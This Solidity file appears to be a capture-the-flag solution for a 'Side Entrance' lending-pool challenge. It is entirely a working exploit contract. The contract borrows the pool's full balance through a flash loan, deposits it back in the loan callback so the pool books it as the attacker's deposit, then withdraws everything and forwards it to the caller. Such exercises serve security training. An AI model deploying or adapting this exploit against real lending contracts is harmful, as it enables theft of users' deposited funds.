// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function withdraw() external;

    function deposit() external payable;
}

contract SideEntranceAttack {
    ISideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "failed to send to player");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
